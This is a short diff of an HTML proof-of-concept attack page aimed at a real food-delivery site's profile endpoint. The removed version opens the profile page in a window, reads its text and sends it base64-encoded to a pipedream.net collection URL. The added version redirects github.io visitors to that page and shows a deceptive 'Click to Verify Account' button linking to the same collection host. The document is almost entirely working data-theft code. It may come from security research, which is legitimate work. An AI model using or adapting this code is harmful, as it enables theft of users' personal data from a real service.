@@ -1,15 +1,11 @@
-<script>
-    // 1. Open the PII page
-    var piiWindow = window.open("https://www.zomato.com/webroutes/getPage?page_url=/profile", "_blank");
-    
-    // 2. Try to read it after it loads
-    setTimeout(function() {
-        try {
-            // If the JSON is raw, it's often inside a <pre> or <body>
-            var data = piiWindow.document.body.innerText;
-            fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(data));
-        } catch (e) {
-            fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
-        }
-    }, 4000);
-</script>
+<html>
+    <body>
+        <script>
+            // If we are on the GitHub page, redirect to the PII page
+            if (window.location.hostname.includes("github.io")) {
+                window.location.href = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
+            }
+        </script>
+        <button onclick="location.href='https://eomfuajl79ed6za.m.pipedream.net/leak'">Click to Verify Account</button>
+    </body>
+</html>
